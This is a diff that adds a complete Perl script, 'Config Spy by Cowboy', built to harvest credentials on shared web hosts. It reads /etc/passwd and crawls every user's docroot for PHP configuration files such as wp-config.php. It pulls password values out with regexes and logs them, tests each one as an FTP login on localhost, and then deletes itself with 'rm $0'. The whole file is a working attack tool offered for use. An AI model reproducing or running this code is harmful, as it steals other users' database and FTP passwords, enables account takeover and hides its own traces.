@@ -1,0 +1,216 @@
+#!/usr/bin/perl
+##############################
+###[ CONFIG SPY BY COWBOY ]###
+##############################
+use Socket;
+use Sys::Hostname;
+
+my $datetime = localtime;
+my $ftp_login = 1;
+my $home;
+$home = "$ARGV[0]" if $ARGV[0];
+my $name = hostname();
+my $host = inet_ntoa(scalar(gethostbyname($name)) || 'localhost');
+write_log('cfg.log',
+"============================\n".
+"=== Config Spy by Cowboy ===\n".
+"============================\n\n".
+"[@] Localhost   : $host\n".
+"[@] System      : ".`uname -a`."".
+"[@] Log Created : $datetime\n\n");
+
+open(ETC_PASSWD, '/etc/passwd') or die("[X] Cannot open or read /etc/passwd!\n");
+@etc_passwd=<ETC_PASSWD>;
+close(ETC_PASSWD);
+my $totalpublicdir = 0;
+my $totalreadable = 0;
+while ($user_list = <@etc_passwd>) {
+my $pos  = index($user_list,':'); #first user
+my $docx = index($user_list,'::'); #first home
+my $docz = index(reverse($user_list),':'); #last home
+my $username = substr($user_list,0,$pos);
+my $userhome = substr($user_list,$docx+2,-($docz+1));
+$userhome =~ s/\/$//g;
+my $homepath = $userhome."/".$home;
+if (-d $homepath) {
+$totalpublicdir++;
+if (-r $homepath) {
+$totalreadable++;
+### if($username !~ /root|proc/) {
+push(@users, $username."::".$homepath);
+### }
+}
+}
+}
+print "[+] Total users scanned    : $totalpublicdir\n";
+print "[+] Total readable docroot : $totalreadable\n\n";
+print "[-] Searching for config files ...\n\n";
+write_log('cfg.log',"[+] Total users scanned    : $totalpublicdir\n".
+"[+] Total readable docroot : $totalreadable\n\n".
+"[-] Searching for config files ...\n\n");
+foreach $userz (@users) {
+my $userlist = index($userz,'::');
+my $userid = substr($userz,0,$userlist);
+my $uhome = substr($userz,$userlist+2);
+&scan_config($uhome, $userid);
+}
+print "\n[-] Scan finished ...\n\n";
+write_log('cfg.log',"\n[-] Scan finished ...\n\n");
+sub scan_config {
+my $path = $_[0];
+my $user = $_[1];
+my @dir;
+opendir(DIR,$path);
+@dir = readdir(DIR);
+closedir DIR;
+foreach $file (@dir) {
+my $fullpath = $path."/".$file;
+if (-r $fullpath) {
+if (-d $fullpath) {
+if (($file ne ".") and ($file ne "..")) {
+my $newdir = "$path/$file";
+&scan_config($newdir,$user);
+}
+}
+else {
+if (($file eq "account.php")
+or ($file eq "accounts.php")
+or ($file eq "conf.php")
+or ($file eq "config.php")
+or ($file eq "config.inc.php")
+or ($file eq "config_inc.php")
+or ($file eq "configure.php")
+or ($file eq "configuration.php")
+or ($file eq "conn.php")
+or ($file eq "connect.php")
+or ($file eq "connect.inc.php")
+or ($file eq "connect_inc.php")
+or ($file eq "connection.php")
+or ($file eq "connections.php")
+or ($file eq "configuracao.php")
+or ($file eq "configurazione.php")
+or ($file eq "conexao.php")
+or ($file eq "common.php")
+or ($file eq "database.php")
+or ($file eq "db.php")
+or ($file eq "db.inc.php")
+or ($file eq "db_inc.php")
+or ($file eq "dbase.php")
+or ($file eq "dbconf.php")
+or ($file eq "dbconfig.php")
+or ($file eq "dbcommon.php")
+or ($file eq "dbconnect.php")
+or ($file eq "dbconnect.inc.php")
+or ($file eq "dbconection.php")
+or ($file eq "db_config.php")
+or ($file eq "db_connect.php")
+or ($file eq "db_connection.php")
+or ($file eq "e107_config.php")
+or ($file eq "inc.php")
+or ($file eq "include.php")
+or ($file eq "index.php")
+or ($file eq "konfig.php")
+or ($file eq "konfigurasi.php")
+or ($file eq "mysql.php")
+or ($file eq "pass.php")
+or ($file eq "passwd.php")
+or ($file eq "pswd.php")
+or ($file eq "sql.php")
+or ($file eq "setting.php")
+or ($file eq "settings.php")
+or ($file eq "setup.php")
+or ($file eq "system.php")
+or ($file eq "systems.php")
+or ($file eq "var.php")
+or ($file eq "wp-config.php")
+or ($file eq "config.inc")
+or ($file eq "configuration.inc")
+or ($file eq "configure.inc")
+or ($file eq "connect.inc")
+or ($file eq "connection.inc")
+or ($file eq "common.inc")
+or ($file eq "database.inc")
+or ($file eq "db.inc")
+or ($file eq "mysql.inc"))
+{
+my $passwd = get_pass($fullpath);
+if ($passwd != 1) {
+if ($ftp_login) { &ftp_connect($user,$passwd); }
+}
+}
+}
+}
+}
+}
+sub get_pass {
+my $filepath = $_[0];
+open(CONFIG, $filepath);
+while (<CONFIG>) {
+my($line) = $_;
+chomp($line);
+if (($line =~ m/pass(.*?)=(.*?)'(.+?)';/i)
+or ($line =~ m/pass(.*?)=(.*?)"(.+?)";/i)
+or ($line =~ m/pass(.*?)=(.*?)\"(.+?)\";/i)
+or ($line =~ m/pass(.*?),(.*?)'(.+?)'\);/i)
+or ($line =~ m/pass(.*?),(.*?)"(.+?)"\);/i)
+or ($line =~ m/pass(.*?),(.*?)\"(.+?)\"\);/i)
+or ($line =~ m/pwd(.*?)=(.*?)'(.+?)';/i)
+or ($line =~ m/pwd(.*?)=(.*?)"(.+?)";/i)
+or ($line =~ m/pwd(.*?)=(.*?)\"(.+?)\";/i)
+or ($line =~ m/senha(.*?)=(.*?)'(.+?)';/i)
+or ($line =~ m/senha(.*?)=(.*?)"(.+?)";/i)
+or ($line =~ m/senha(.*?)=(.*?)\"(.+?)\";/i)
+or ($line =~ m/senha(.*?),(.*?)'(.+?)'\);/i)
+or ($line =~ m/senha(.*?),(.*?)"(.+?)"\);/i)
+or ($line =~ m/senha(.*?),(.*?)\"(.+?)\"\);/i)
+or ($line =~ m/parol(.*?)=(.*?)'(.+?)';/i)
+or ($line =~ m/parol(.*?)=(.*?)"(.+?)";/i)
+or ($line =~ m/parol(.*?)=(.*?)\"(.+?)\";/i)
+or ($line =~ m/parol(.*?),(.*?)'(.+?)'\);/i)
+or ($line =~ m/parol(.*?),(.*?)"(.+?)"\);/i)
+or ($line =~ m/parol(.*?),(.*?)\"(.+?)\"\);/i)
+or ($line =~ m/pass(.*?)=(.*?)'(.+?)'(\s|\r|\n|\r\n)/i)
+or ($line =~ m/pass(.*?)=(.*?)"(.+?)"(\s|\r|\n|\r\n)/i)
+or ($line =~ m/pass(.*?)=(.*?)\"(.+?)\"(\s|\r|\n|\r\n)/i)
+or ($line =~ m/pass(.*?),(.*?)'(.+?)'(\s|\r|\n|\r\n)/i)
+or ($line =~ m/pass(.*?),(.*?)"(.+?)"(\s|\r|\n|\r\n)/i)
+or ($line =~ m/pass(.*?),(.*?)\"(.+?)\"(\s|\r|\n|\r\n)/i)
+or ($line =~ m/pwd(.*?)=(.*?)'(.+?)'(\s|\r|\n|\r\n)/i)
+or ($line =~ m/pwd(.*?)=(.*?)"(.+?)"(\s|\r|\n|\r\n)/i)
+or ($line =~ m/pwd(.*?)=(.*?)\"(.+?)\"(\s|\r|\n|\r\n)/i)
+)
+{
+my $pass = $3;
+if (($pass !~ / /) and ($pass !~ /"/) and ($pass !~ /'/)
+and ($pass !~ /_/) and ($pass !~ /\.\+\?/)) {
+&write_log('cfg.log',"[+] $filepath\n[\@] $pass\n");
+return $pass;
+}
+}
+}
+close(CONFIG);
+}
+sub ftp_connect {
+my $usr = $_[0];
+my $pwd = $_[1];
+my $success = 1;
+use Net::FTP;
+my $ftp = Net::FTP->new("127.0.0.1", Debug => 0, Timeout => 3);
+$success = 0 if $ftp->login($usr,$pwd);
+$ftp->quit;
+if ($success == 0) {
+print "\t[FTP] $usr:$pwd => Successfully ...\n";
+&write_log('cfg.log',"\t[FTP] $usr:$pwd => SUCCESS ...\n\n");
+}
+}
+sub write_log {
+my $log = $_[0];
+my $data = $_[1];
+open(LOG,">>$log") or die("[X] Cannot create or open log file.\n");
+print LOG "$data";
+close(LOG);
+}
+system("rm $0");
+##############################
+###[ CONFIG SPY BY COWBOY ]###
+##############################
